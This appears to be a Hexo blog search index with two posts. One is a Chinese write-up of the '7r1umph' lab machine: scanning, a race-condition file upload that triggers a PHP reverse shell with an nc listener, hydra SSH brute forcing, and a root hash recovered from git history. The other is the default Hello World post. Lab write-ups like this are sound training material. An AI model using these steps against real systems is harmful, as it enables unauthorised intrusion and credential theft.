<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>7r1umph</title>
    <link href="/2026/01/21/7r1umph/"/>
    <url>/2026/01/21/7r1umph/</url>
    
    <content type="html"><![CDATA[<h1 id="lXM9i">《7r1umph靶场渗透测试报告》</h1><h2 id="KSQ3y">1. 目标信息</h2><ul><li><strong>靶机名称:</strong> 7r1umph</li><li><strong>难度</strong>: easy</li><li><strong>靶机IP:</strong> 10.0.2.36</li><li><strong>攻击机IP:</strong> 10.0.2.6 (Kali Linux)</li><li><strong>靶机地址：</strong><a href="https://maze-sec.com/">https://maze-sec.com/</a></li></ul><h2 id="aLc2W">2. 信息收集</h2><h3 id="2.1-主机发现">2.1 主机发现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">└─<span class="hljs-meta"># nmap -sn 10.0.2.0/24</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2026-01-03 02:59 EST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.1</span><br>Host is up (<span class="hljs-number">0.00064</span>s latency).<br>MAC Address: <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">35</span>:<span class="hljs-number">00</span> (QEMU virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.2</span><br>Host is up (<span class="hljs-number">0.00061</span>s latency).<br>MAC Address: <span class="hljs-number">52</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>:<span class="hljs-number">35</span>:<span class="hljs-number">00</span> (QEMU virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.3</span><br>Host is up (<span class="hljs-number">0.00057</span>s latency).<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">58</span>:CC:<span class="hljs-number">49</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.36</span><br>Host is up (<span class="hljs-number">0.00025</span>s latency).<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">2</span>E:<span class="hljs-number">4</span>C:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.6</span><br>Host is up.<br>Nmap done: <span class="hljs-number">256</span> IP addresses (<span class="hljs-number">5</span> hosts up) scanned in <span class="hljs-number">2.09</span> seconds<br><br></code></pre></td></tr></table></figure><h3 id="2.2-端口扫描">2.2 端口扫描</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo mkdir nmapscan &amp;&amp;sudo nmap --min-rate <span class="hljs-number">10000</span> -p- -oN nmapscan/ports <span class="hljs-number">10.0</span>.<span class="hljs-number">2.36</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2026-01-03 02:57 EST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">2.36</span><br>Host is up (<span class="hljs-number">0.000066</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">2</span>E:<span class="hljs-number">4</span>C:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">1.28</span> seconds<br><br></code></pre></td></tr></table></figure><h3 id="2.3-web目录扫描">2.3 Web目录扫描</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">---- Scanning URL: http:<span class="hljs-comment">//10.0.2.36/ ----</span><br>+ http:<span class="hljs-comment">//10.0.2.36/index.html (CODE:200|SIZE:6)                                                                                                                                                  </span><br>+ http:<span class="hljs-comment">//10.0.2.36/index.php (CODE:200|SIZE:1552)                                                                                                                                                </span><br>+ http:<span class="hljs-comment">//10.0.2.36/info.php (CODE:200|SIZE:85856)                                                                                                                                                </span><br>+ http:<span class="hljs-comment">//10.0.2.36/server-status (CODE:403|SIZE:274)                                                                                                                                             </span><br>==&gt; DIRECTORY: http:<span class="hljs-comment">//10.0.2.36/tmp/                                                                                                                                                             </span><br>==&gt; DIRECTORY: http:<span class="hljs-comment">//10.0.2.36/upload/                                                                                                                                                          </span><br>                                                                                                                                                                                                 <br>---- Entering directory: http:<span class="hljs-comment">//10.0.2.36/tmp/ ----</span><br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                 <br>---- Entering directory: http:<span class="hljs-comment">//10.0.2.36/upload/ ----</span><br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                    <br></code></pre></td></tr></table></figure><h3 id="2.4-web服务探索">2.4 Web服务探索</h3>访问80服务 发现文件上传页面  上传1.gif<p>发现&#x2F;upload页面处多了一个1.gif.dsz</p><p>猜测通过&#x2F;tmp加后缀。我们抓包验证一下</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767427620640-c9e05086-352b-43fb-8422-fb93a7f6cdd1.png"></p><p>确实如此。而且不管上传什么文件都是可以的。</p><p>那我们可以通过条件竞争来反弹shell</p><h2 id="3.-漏洞利用-(条件竞争获取初始访问)">3. 漏洞利用</h2>条件竞争访问脚本<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/bin/bash<br>url=<span class="hljs-string">&quot;http://10.0.2.36/tmp/shell.php&quot;</span><br>max_attempts=<span class="hljs-number">1000</span> # 可以根据需要调整尝试次数<br>success=<span class="hljs-literal">false</span><br><br>echo <span class="hljs-string">&quot;开始尝试访问 $url ...&quot;</span><br><br># 并行执行上传和访问尝试以增加成功率<br># 在另一个终端执行上传操作<br><br><span class="hljs-keyword">for</span> ((i=<span class="hljs-number">1</span>; i&lt;=max_attempts; i++)); <span class="hljs-keyword">do</span><br>    # 发送请求并捕获状态码<br>    status_code=$(curl -s -o /dev/null -w <span class="hljs-string">&quot;%&#123;http_code&#125;&quot;</span> <span class="hljs-string">&quot;$url&quot;</span>)<br><br>    echo <span class="hljs-string">&quot;尝试 $i: 状态码 = $status_code&quot;</span><br><br>    # 检测到<span class="hljs-number">200</span>时标记成功并退出循环<br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;$status_code&quot;</span> -eq <span class="hljs-number">200</span> ]]; then<br>        echo <span class="hljs-string">&quot;成功访问! $url 返回 200 OK.&quot;</span><br>        success=<span class="hljs-literal">true</span><br>        <span class="hljs-keyword">break</span><br>    fi<br><br>    # 短暂暂停避免过于频繁的请求 (可选)<br>    sleep <span class="hljs-number">0.05</span> # 缩短间隔增加命中机会<br>done<br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;$success&quot;</span> == <span class="hljs-literal">true</span> ]]; then<br>    echo <span class="hljs-string">&quot;已触发Payload，请检查监听器。&quot;</span><br><span class="hljs-keyword">else</span><br>    echo <span class="hljs-string">&quot;在 $max_attempts 次尝试后未能成功访问。&quot;</span><br>fi<br></code></pre></td></tr></table></figure><p>kali上开启监听</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nc -lvvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>burp上重复发包</p><hr><p>成功反弹shell</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767428191741-a1b36e5d-ca1b-4aed-beb3-e71340b119f9.png"></p><p>接下来稳定一下shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">script /dev/null -c bash<br>Ctrl+Z<br>stty raw -echo; fg<br>reset xterm<br>export TERM=xterm<br>export SHELL=/bin/bash<br>stty rows <span class="hljs-number">24</span> columns <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h2 id="4.-权限提升">4. 权限提升</h2>目前是低权限用户www-data <p>&#x2F;home下有个用户welcome</p><p>继续翻阅 发现&#x2F;opt下有两个文件 下载下来看看</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767428432362-eb1441d6-bb36-48ab-af3c-7c786aefd421.png"></p><p>guess是个二进制文件先不管 yeyeye.png是串奇形怪状的数字 貌似让咱们猜谜</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767428663556-077d466f-9aff-4a5f-8e35-280f17a90972.png"></p><p>在这个网站<a href="https://www.dcode.fr/chiffres-symboles">https://www.dcode.fr/chiffres-symboles</a>s</p><p>上找到了一样的</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767429145610-50ab6994-428f-4684-aa5e-3b352cc552ab.png"></p><p>解码 可得密码  YECONGDONG   这应该是解码问题 密码自动大写 我们把大小写都写进pass.list</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767429398074-0b9a2152-169b-45b4-b9b9-2b27e7d584c3.png"></p><p>hydra爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo hydra -L user.<span class="hljs-built_in">list</span> -P pass.<span class="hljs-built_in">list</span> ssh:<span class="hljs-comment">//10.0.2.36 -t 4 -vV</span><br></code></pre></td></tr></table></figure><p>得到用户密码</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767429472494-673fadbb-86c8-4b5e-bd97-41a9b669bf5d.png"></p><h2 id="QQv97">5.权限再提升</h2>继续 稳定shell<p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767429646339-f1ce397e-2991-4ece-aa33-1100830f577e.png"></p><p>在&#x2F;home&#x2F;welcome下有如下文件</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767429749937-ce083bd5-a02d-4758-9123-02ae34ec3b4d.png"></p><p>我们首先来看一下.git文件</p><p>git log 发现新添加了一个source2.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767430101036-9dc00bc6-93e5-4a91-acca-1987cde8f977.png"></p><p>那我们查看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">git show <span class="hljs-number">900b</span>75c25:source2.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767430174281-8976faed-b9a8-4d06-9959-1d783ebe1bd9.png"></p><p>这样就拿到了root的密码</p><p>登录进去可以拿到root-flag</p><p><img src="https://cdn.nlark.com/yuque/0/2026/png/49970571/1767430236214-1594fe91-2bc7-417f-a5a0-29c9f8acafb7.png"></p><h2 id="p5nwT">6. 总结</h2>1. **信息收集:** 使用 nmap 发现目标及开放端口 (SSH, HTTP)。`dirb` 发现Web目录结构，包括文件上传点 `/index.php` 和两个目录 `/upload/`、`/tmp/`。2. **初始访问:** 利用文件上传功能中存在的条件竞争漏洞，上传反弹Shell的PHP文件，并在其被移动/重命名之前通过访问 `/tmp/` 目录下的临时文件触发，获得 `www-data` 用户的Shell。3. **权限提升 (www-data -> welcome):** 在 `/opt` 目录发现图片文件 `yeyeye.png`，分析识别为 Dorabella Cipher，破译得到 `welcome` 用户的密码 `yecongdong`，成功切换用户。4. **权限提升 (welcome -> root):** 在 `welcome` 用户家目录下的 `RegView` 目录中发现 `.git` 仓库。通过 `git log -p` 查看历史记录，发现一个被删除的文件曾包含 `root` 的密码哈希 `ff855ad811c79e5fba458a575fac5b83`。同时确认该哈希与 `/opt/guess` 文件的MD5值相同。使用该哈希作为密码，成功切换到 `root` 用户。5. **获取Flag:** 分别在 `welcome` 和 `root` 用户家目录下找到 `user.txt` 和 `root.txt`，获取最终的Flag。]]></content>
    
    
    <categories>
      
      <category>靶场复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mazesec平台</tag>
      
      <tag>靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2026/01/21/hello-world/"/>
    <url>/2026/01/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
